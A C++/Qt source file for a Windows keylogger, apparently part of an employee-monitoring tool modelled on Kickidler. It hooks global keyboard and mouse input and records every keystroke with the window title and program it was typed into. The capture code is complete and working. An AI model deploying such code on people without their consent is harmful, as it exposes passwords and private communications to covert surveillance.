#include "keylogger.h"

#include <QDateTime>

Keylogger *Keylogger::s_instance = nullptr;

Keylogger::Keylogger(QObject *parent)
    : QObject(parent)
{
    m_flushTimer.setInterval(2000);
    connect(&m_flushTimer, &QTimer::timeout, this, &Keylogger::flush);
}

Keylogger::~Keylogger()
{
    stop();
}

#ifdef Q_OS_WIN

namespace {
QString foregroundWindowTitle()
{
    HWND fg = GetForegroundWindow();
    if (!fg) {
        return QString();
    }
    wchar_t buffer[256] = {0};
    GetWindowTextW(fg, buffer, 256);
    return QString::fromWCharArray(buffer);
}

// The foreground window's executable name (as ForegroundObserver reports
// it), so a keylogger chunk carries the program it was typed into.
QString foregroundExecutable()
{
    HWND fg = GetForegroundWindow();
    if (!fg) {
        return QString();
    }
    DWORD processId = 0;
    GetWindowThreadProcessId(fg, &processId);
    if (processId == 0) {
        return QString();
    }
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!process) {
        return QString();
    }
    QString name;
    wchar_t path[MAX_PATH] = {0};
    DWORD size = MAX_PATH;
    if (QueryFullProcessImageNameW(process, 0, path, &size)) {
        const QString fullPath = QString::fromWCharArray(path, static_cast<int>(size));
        const int slash = fullPath.lastIndexOf(QLatin1Char('\\'));
        name = slash >= 0 ? fullPath.mid(slash + 1) : fullPath;
    }
    CloseHandle(process);
    return name;
}

// Best-effort virtual-key -> readable text, matching the bracketed-special-
// key style visible in the Kickidler reference (e.g. "<ENTER>",
// "<CAPSLOCK>") rather than trying to be a perfect terminal emulator.
QString keyToText(DWORD vkCode)
{
    switch (vkCode) {
    case VK_RETURN: return QStringLiteral("<ENTER>");
    case VK_BACK: return QStringLiteral("<BACKSPACE>");
    case VK_TAB: return QStringLiteral("<TAB>");
    case VK_ESCAPE: return QStringLiteral("<ESC>");
    case VK_CAPITAL: return QStringLiteral("<CAPSLOCK>");
    case VK_SPACE: return QStringLiteral(" ");
    case VK_LEFT: return QStringLiteral("<LEFT>");
    case VK_RIGHT: return QStringLiteral("<RIGHT>");
    case VK_UP: return QStringLiteral("<UP>");
    case VK_DOWN: return QStringLiteral("<DOWN>");
    case VK_DELETE: return QStringLiteral("<DEL>");
    case VK_HOME: return QStringLiteral("<HOME>");
    case VK_END: return QStringLiteral("<END>");
    default:
        break;
    }

    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);
    wchar_t chars[5] = {0};
    const int result = ToUnicode(vkCode, MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC), keyboardState,
                                 chars, 4, 0);
    if (result >= 1) {
        return QString::fromWCharArray(chars, result);
    }
    return QString();
}
}

LRESULT CALLBACK Keylogger::keyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION && s_instance
        && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto *info = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        s_instance->handleKeyDown(info->vkCode);
    }
    return CallNextHookEx(nullptr, code, wParam, lParam);
}

LRESULT CALLBACK Keylogger::mouseProc(int code, WPARAM wParam, LPARAM lParam)
{
    Q_UNUSED(lParam)
    if (code == HC_ACTION && s_instance
        && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN
            || wParam == WM_MBUTTONDOWN || wParam == WM_MOUSEWHEEL)) {
        s_instance->noteActivity();
    }
    return CallNextHookEx(nullptr, code, wParam, lParam);
}

void Keylogger::handleKeyDown(DWORD vkCode)
{
    noteActivity();

    const QString title = foregroundWindowTitle();
    const QString application = foregroundExecutable();
    if (title != m_pendingWindowTitle || application != m_pendingApplication) {
        flush();
        m_pendingWindowTitle = title;
        m_pendingApplication = application;
    }
    if (m_pendingText.isEmpty()) {
        m_pendingBeginMs = QDateTime::currentMSecsSinceEpoch();
    }
    m_pendingText += keyToText(vkCode);
}

void Keylogger::noteActivity()
{
    m_activityCount.fetch_add(1, std::memory_order_relaxed);
}

bool Keylogger::start()
{
    s_instance = this;
    m_keyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, keyboardProc, nullptr, 0);
    m_mouseHook = SetWindowsHookExW(WH_MOUSE_LL, mouseProc, nullptr, 0);
    if (!m_keyboardHook || !m_mouseHook) {
        stop();
        return false;
    }
    m_flushTimer.start();
    return true;
}

void Keylogger::stop()
{
    m_flushTimer.stop();
    if (m_keyboardHook) {
        UnhookWindowsHookEx(m_keyboardHook);
        m_keyboardHook = nullptr;
    }
    if (m_mouseHook) {
        UnhookWindowsHookEx(m_mouseHook);
        m_mouseHook = nullptr;
    }
    if (s_instance == this) {
        s_instance = nullptr;
    }
}

#else

bool Keylogger::start() { return false; }
void Keylogger::stop() {}

#endif

int Keylogger::consumeActivityCount()
{
    return m_activityCount.exchange(0, std::memory_order_relaxed);
}

void Keylogger::flush()
{
    if (!m_pendingText.isEmpty()) {
        emit textFlushed(m_pendingWindowTitle, m_pendingText, m_pendingBeginMs, m_pendingApplication);
        m_pendingText.clear();
    }
}
